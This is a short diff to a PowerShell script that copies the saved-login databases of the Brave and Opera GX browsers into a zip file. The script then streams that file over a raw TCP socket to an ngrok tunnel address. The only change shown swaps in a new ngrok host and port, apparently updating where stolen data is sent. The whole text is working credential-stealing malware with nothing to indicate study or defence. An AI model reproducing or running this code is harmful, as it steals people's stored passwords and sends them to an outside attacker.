@@ -7,7 +7,7 @@ if (Test-Path $zip) { Remove-Item $zip -Force }
 Copy-Item "$local\BraveSoftware\Brave-Browser\User Data\Default\Login Data" $tempFile -Force
 Compress-Archive "$roaming\Opera Software\Opera GX Stable\Default\Login Data", $tempFile -DestinationPath $zip -Force
 Remove-Item $tempFile -Force
-$c = New-Object Net.Sockets.TCPClient("2.tcp.eu.ngrok.io", 13953)
+$c = New-Object Net.Sockets.TCPClient("4.tcp.eu.ngrok.io", 10255)
 $s = $c.GetStream()
 $b = [IO.File]::ReadAllBytes($zip)
 $s.Write($b,0,$b.Length)
